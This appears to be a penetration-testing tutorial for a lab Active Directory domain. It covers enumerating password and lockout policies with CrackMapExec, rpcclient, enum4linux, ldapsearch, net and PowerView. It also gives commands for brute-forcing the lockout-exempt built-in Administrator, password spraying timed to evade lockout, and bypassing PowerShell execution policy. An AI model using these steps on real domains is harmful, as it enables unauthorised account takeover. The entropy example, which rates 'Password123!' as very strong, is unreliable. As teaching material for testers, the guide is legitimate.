# Credential Hygiene

### Overview

**Password Policy** in Active Directory defines the security requirements for user passwords within a domain, including complexity rules, length requirements, lockout thresholds, and password age limits. Understanding password policies is crucial for both defense and offensive security operations, as weak policies create opportunities for credential attacks while strong policies may require different attack strategies.

**Key Concepts:**

* **Password Complexity** - Requirements for character types (uppercase, lowercase, numbers, symbols)
* **Account Lockout Policy** - Rules governing account lockout after failed login attempts
* **Password Age** - Minimum and maximum time periods for password validity
* **Password History** - Number of previous passwords that cannot be reused

**Common Ports:**

* **445/TCP** - SMB (CrackMapExec enumeration)
* **135/TCP** - RPC (rpcclient enumeration)
* **389/TCP** - LDAP (ldapsearch enumeration)

**Default Policy Location:**

* `\\DOMAIN\sysvol\DOMAIN\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf`

***

### Exploitation Workflow Summary

1. Initial Enumeration ├─ Identify domain controllers ├─ Test anonymous access └─ Enumerate SMB/RPC services
2. Policy Discovery ├─ Authenticated enumeration (if credentials available) ├─ Null session enumeration (if allowed) └─ LDAP anonymous queries
3. Policy Analysis ├─ Extract password requirements ├─ Identify lockout thresholds ├─ Note password age settings └─ Check history length
4. Attack Strategy Selection ├─ Determine if brute force is safe ├─ Calculate password spray delay └─ Identify exempt accounts
5. Exploitation ├─ Target built-in Administrator (no lockout) ├─ Password spraying (respecting lockout) └─ Credential stuffing attacks

***

### Built-in Administrator Account Exception

#### Understanding the Exception

The **built-in Administrator account (RID 500)** is exempt from the Account Lockout Policy by design. This critical security feature ensures that administrative access remains available even during mass lockout events or brute force attacks.

**Why this matters:**

* Can safely brute force without triggering lockout
* Always available for emergency domain recovery
* Different from regular admin accounts (which ARE subject to lockout)
* Often has predictable or weak passwords

**Important distinction:**

```
Built-in Administrator (RID 500)     → NO lockout protection
Domain Admin users                    → YES, subject to lockout
Other administrative accounts         → YES, subject to lockout
```

#### Identifying the Built-in Administrator

**Using CrackMapExec:**

```bash
crackmapexec smb 10.10.10.10 -u Administrator -p passwords.txt --continue-on-success
```

**Parameters:**

* `smb` - Target SMB protocol
* `-u Administrator` - Default name (can be renamed)
* `-p passwords.txt` - Password list for brute force
* `--continue-on-success` - Don't stop after first success

**Expected behavior:**

```
SMB  10.10.10.10  445  DC01  [-] DOMAIN\Administrator:Password1
SMB  10.10.10.10  445  DC01  [-] DOMAIN\Administrator:Password2
SMB  10.10.10.10  445  DC01  [+] DOMAIN\Administrator:Password123 (Pwn3d!)
```

Notice: No lockout occurs regardless of failed attempts.

***

### Authenticated Policy Enumeration

#### CrackMapExec Method

**Retrieve complete password policy:**

```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

**Parameters explained:**

* `-u avazquez` - Valid domain username
* `-p Password123` - User's password
* `--pass-pol` - Retrieve password policy information

**Expected output:**

```
SMB  172.16.5.5  445  DC01  [+] DOMAIN\avazquez:Password123
SMB  172.16.5.5  445  DC01  [+] Dumping password info for domain: DOMAIN
SMB  172.16.5.5  445  DC01  Minimum password length: 8
SMB  172.16.5.5  445  DC01  Password history length: 24
SMB  172.16.5.5  445  DC01  Maximum password age: Unlimited
SMB  172.16.5.5  445  DC01  Password Complexity Flags: 000001
SMB  172.16.5.5  445  DC01  Minimum password age: 1 day
SMB  172.16.5.5  445  DC01  Reset Account Lockout Counter: 30 minutes
SMB  172.16.5.5  445  DC01  Locked Account Duration: 30 minutes
SMB  172.16.5.5  445  DC01  Account Lockout Threshold: 5
```

**Key values to note:**

* **Lockout Threshold: 5** - Account locks after 5 failed attempts
* **Lockout Duration: 30 minutes** - Account automatically unlocks after 30 minutes
* **Reset Counter: 30 minutes** - Failed attempt counter resets after 30 minutes
* **Minimum Length: 8** - Passwords must be at least 8 characters

***

### Null Session Enumeration

#### Understanding Null Sessions

**Null sessions** allow anonymous connections to network services without authentication. While largely disabled in modern environments, they still exist in legacy systems and misconfigured domains.

**What it provides:**

* Anonymous access to certain RPC and SMB functions
* Ability to query domain information
* Password policy enumeration without credentials

#### RPCclient Enumeration

**Establishing null session:**

```bash
rpcclient -U "" -N 172.16.5.5
```

**Parameters:**

* `-U ""` - Empty username (anonymous)
* `-N` - No password required
* `172.16.5.5` - Target domain controller

**Query domain information:**

```bash
rpcclient $> querydominfo
```

**Expected output:**

```
Domain:    INLANEFREIGHT
Server:    DC01
Comment:   
Total Users: 3650
Total Groups: 125
Total Aliases: 50
Sequence No: 1
Force Logoff: -1
Domain Server State: 0x1
Server Role: ROLE_DOMAIN_PDC
Unknown 3: 0x1
```

**Query password policy:**

```bash
rpcclient $> getdompwinfo
```

**Expected output:**

```
min_password_length: 8
password_properties: 0x00000001
DOMAIN_PASSWORD_COMPLEX
```

**Understanding password\_properties flags:**

```
0x00000001 = DOMAIN_PASSWORD_COMPLEX (Complexity required)
0x00000002 = DOMAIN_PASSWORD_NO_ANON_CHANGE
0x00000004 = DOMAIN_PASSWORD_NO_CLEAR_CHANGE
0x00000008 = DOMAIN_LOCKOUT_ADMINS (Admin accounts can be locked)
0x00000010 = DOMAIN_PASSWORD_STORE_CLEARTEXT
0x00000020 = DOMAIN_REFUSE_PASSWORD_CHANGE
```

#### Enum4linux Enumeration

**Basic password policy enumeration:**

```bash
enum4linux -P 172.16.5.5
```

**Parameters:**

* `-P` - Password policy information only

**Modern version with better output:**

```bash
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

**Parameters:**

* `-P` - Get password policy
* `-oA ilfreight` - Output all formats with prefix "ilfreight"

**Expected output:**

```
[+] Password Info:
    [*] Password Complexity Flags: DOMAIN_PASSWORD_COMPLEX
        [*] Domain Refuse Password Change: 0
        [*] Domain Password Store Cleartext: 0
        [*] Domain Password Lockout Admins: 0
        [*] Domain Password No Clear Change: 0
        [*] Domain Password No Anon Change: 0
        [*] Domain Password Complex: 1
    [*] Minimum password length: 8
    [*] Password history length: 24
    [*] Maximum password age: Not Set
    [*] Minimum password age: 1 day 4 minutes
    [*] Lockout threshold: 5
    [*] Locked account duration: 30 minutes
    [*] Lockout observation window: 30 minutes
```

#### LDAP Anonymous Query

**Query password policy via LDAP:**

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

**Parameters explained:**

* `-h 172.16.5.5` - LDAP server address
* `-x` - Simple authentication (no SASL)
* `-b "DC=INLANEFREIGHT,DC=LOCAL"` - Base DN for search
* `-s sub` - Subtree search scope
* `"*"` - Search for all attributes
* `grep -m 1 -B 10 pwdHistoryLength` - Find password policy object

**Expected output:**

```
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
pwdHistoryLength: 24
pwdProperties: 1
```

**Understanding LDAP time values:**

* Negative values are in 100-nanosecond intervals
* Convert to minutes: value / 10,000,000 / 60
* Example: -18000000000 / 10,000,000 / 60 = 30 minutes

***

### Windows Native Enumeration

#### Command Prompt Method

**Establish null session connection:**

```cmd
net use \\DC01\ipc$ "" /u:""
```

**Parameters:**

* `\\DC01\ipc$` - IPC share on domain controller
* `""` - Empty password
* `/u:""` - Empty username

**Expected output:**

```
The command completed successfully.
```

**Query password policy:**

```cmd
net accounts
```

**Expected output:**

```
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

**Understanding the output:**

* **Force logoff: Never** - Users aren't kicked when password expires
* **Min age: 1 day** - Users must wait 1 day between password changes
* **Max age: Unlimited** - Passwords never expire (security risk!)
* **Lockout threshold: 5** - Account locks after 5 failed attempts
* **Lockout duration: 30 minutes** - How long account stays locked
* **Observation window: 30 minutes** - Time period for counting failed attempts

#### PowerShell with PowerView

**Import PowerView module:**

```powershell
Import-Module .\PowerView.ps1
```

**Retrieve domain policy:**

```powershell
Get-DomainPolicy
```

**Expected output:**

```
Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```

**Key SystemAccess values:**

* `MinimumPasswordAge=1` - 1 day minimum age
* `MaximumPasswordAge=-1` - Unlimited (never expires)
* `MinimumPasswordLength=8` - 8 characters minimum
* `PasswordComplexity=1` - Complexity enabled
* `PasswordHistorySize=24` - Remembers last 24 passwords
* `LockoutBadCount=5` - 5 attempts before lockout
* `ResetLockoutCount=30` - 30 minute observation window
* `LockoutDuration=30` - 30 minute lockout duration

**Key KerberosPolicy values:**

* `MaxTicketAge=10` - TGT valid for 10 hours
* `MaxRenewAge=7` - TGT renewable for 7 days
* `MaxServiceAge=600` - Service ticket valid for 600 minutes
* `MaxClockSkew=5` - 5 minutes clock skew tolerance

***

### Password Policy Analysis

#### Calculating Safe Attack Parameters

**For Password Spraying:**

Given this policy:

* Lockout threshold: 5 attempts
* Observation window: 30 minutes
* Lockout duration: 30 minutes

**Safe strategy:**

```
Attempts per cycle: 3 (stay below threshold of 5)
Wait time between cycles: 31 minutes (exceed observation window)
Total attempts per day: 3 attempts × 46 cycles = 138 attempts/day
```

**Why this works:**

1. Use only 3 of 5 allowed attempts (safety margin)
2. Wait 31 minutes between cycles
3. Failed attempt counter resets after 30 minutes
4. Never trigger lockout threshold

#### Password Strength Calculation

**Understanding entropy:**

* **Entropy** measures password unpredictability in bits
* Higher entropy = stronger password
* Required entropy depends on attack speed

**Character set sizes:**

```
Lowercase only (a-z):           26 characters
Lowercase + uppercase:          52 characters
Alphanumeric:                   62 characters
Alphanumeric + symbols:         95 characters
```

**Entropy formula:**

```
Entropy = Length × log2(Character Set Size)
```

**Example calculation:**

```
Password: "Password123!"
Length: 12 characters
Character set: 95 (lowercase + uppercase + numbers + symbols)
Entropy: 12 × log2(95) = 12 × 6.57 = 78.8 bits
```

**Practical implications:**

* < 40 bits: Weak (crackable in hours)
* 40-60 bits: Medium (crackable in days/weeks)
* 60-80 bits: Strong (crackable in months/years)
* > 80 bits: Very strong (impractical to brute force)

***

### Troubleshooting

#### Error: "Access Denied" with rpcclient

**Problem:** Cannot establish null session

```
Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED
```

**Solution:** Check if null sessions are disabled (modern default):

```bash
# Try with a valid user account instead
rpcclient -U "username%password" 172.16.5.5
```

**Why it works:** Modern Windows servers disable null sessions by default. You need valid credentials.

#### Error: "Network Path Not Found"

**Problem:** Cannot reach domain controller

```
ERROR: Cannot connect - NT_STATUS_NETWORK_PATH_NOT_FOUND
```

**Solution:**

1. Verify DC is reachable:

```bash
ping 172.16.5.5
```

2. Check if SMB port is open:

```bash
nmap -p 445 172.16.5.5
```

3. Try using hostname instead of IP:

```bash
crackmapexec smb DC01.domain.local -u user -p pass --pass-pol
```

**Why it works:** Some DCs require proper hostname resolution for SMB connections.

#### Error: "Lockout Threshold Shows 0"

**Problem:** Policy shows no lockout

```
Lockout threshold: 0
```

**Understanding:**

* `0` means account lockout is DISABLED
* Brute force attacks won't trigger lockouts
* This is a serious security misconfiguration

**Exploitation opportunity:**

```bash
# Safe to brute force any account (no lockout risk)
crackmapexec smb 172.16.5.5 -u users.txt -p passwords.txt
```

#### PowerView Not Loading

**Problem:** Import-Module fails

```
Import-Module : File cannot be loaded because running scripts is disabled
```

**Solution:**

```powershell
# Check execution policy
Get-ExecutionPolicy

# Bypass for current session
powershell -ep bypass

# Then import
Import-Module .\PowerView.ps1
```

**Why it works:** PowerShell execution policy blocks unsigned scripts. Bypass allows script execution.

***

### Quick Reference

#### Enumeration Commands

```bash
# CrackMapExec (authenticated)
crackmapexec smb TARGET -u USER -p PASS --pass-pol

# RPCclient (null session)
rpcclient -U "" -N TARGET
rpcclient $> getdompwinfo

# Enum4linux
enum4linux -P TARGET
enum4linux-ng -P TARGET -oA output

# LDAP query
ldapsearch -h TARGET -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -B 10 pwdHistoryLength
```

#### Windows Commands

```cmd
# Null session
net use \\DC\ipc$ "" /u:""

# Get policy
net accounts
```

#### PowerShell Commands

```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

#### Attack Strategy Selection

```bash
# Built-in Admin (no lockout)
crackmapexec smb TARGET -u Administrator -p passwords.txt --continue-on-success

# Password spray (safe)
crackmapexec smb TARGET -u users.txt -p 'Spring2024!' --continue-on-success
# Wait 31 minutes, repeat with different password
```

#### Key Policy Values to Extract

```
✓ Minimum password length
✓ Password complexity requirements
✓ Password history length
✓ Lockout threshold
✓ Lockout duration
✓ Lockout observation window
✓ Minimum password age
✓ Maximum password age
```

